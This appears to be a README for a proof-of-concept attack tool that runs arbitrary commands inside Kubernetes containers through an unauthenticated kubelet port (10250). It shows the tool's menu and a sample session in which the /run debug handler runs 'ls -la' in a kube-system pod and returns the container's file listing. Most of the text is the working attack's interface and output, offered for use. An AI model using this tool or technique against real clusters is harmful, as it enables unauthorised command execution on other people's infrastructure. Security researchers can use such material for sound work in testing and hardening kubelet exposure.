run "pip install -r requirements.txt"
# Kubernetes-Kubelet-POC

Everybody who has access to the service kubelet port (10250), even without a certificate, can execute any command inside the container.

``` __  __ _______ ______ _______ ______ _______ _______ __  __ _______ 
|  |/  |   |   |   __ \    ___|   __ \    |  |   |   |  |/  |    ___|
|     <|   |   |   __ <    ___|      <       |   |   |     <|    ___|
|__|\__|_______|______/_______|___|__|__|____|_______|__|\__|_______|
Help Desk: If you already have the namespace, pod & container name,
Select "1" and enter the target without "run" or "exec" in the URL. (E.g. https://10.10.10.10:10250/namespace/pod/container)
If you do not know the namespace, pod or container then select 2.

Enter "0" at any point to return to the main menu
1) Current Host: "https://k8s-node-1:10250/"

2) Find Namespace, Pods & Container Names
3) Use RUN Debug Handler
4) Use EXEC Debug Handler
5) Clear Screen
6) Exit

Enter Selection: 3
Parameters: https://k8s-node-1:10250/run/kube-system/node-exporter-iuwg7/node-exporter

CMD: ls -la
total 12
drwxr-xr-x   13 root     root           148 Aug 26 11:31 .
drwxr-xr-x   13 root     root           148 Aug 26 11:31 ..
-rwxr-xr-x    1 root     root             0 Aug 26 11:31 .dockerenv
drwxr-xr-x    2 root     root          8192 May  5 22:22 bin
drwxr-xr-x    5 root     root           380 Aug 26 11:31 dev
drwxr-xr-x    3 root     root           135 Aug 26 11:31 etc
drwxr-xr-x    2 nobody   nogroup          6 Mar 18 16:38 home
drwxr-xr-x    2 root     root             6 Apr 23 11:17 lib
dr-xr-xr-x  353 root     root             0 Aug 26 07:14 proc
drwxr-xr-x    2 root     root             6 Mar 18 16:38 root
dr-xr-xr-x   13 root     root             0 Aug 26 15:12 sys
drwxrwxrwt    2 root     root             6 Mar 18 16:38 tmp
drwxr-xr-x    4 root     root            31 Apr 23 11:17 usr
drwxr-xr-x    5 root     root            41 Aug 26 11:31 var
```

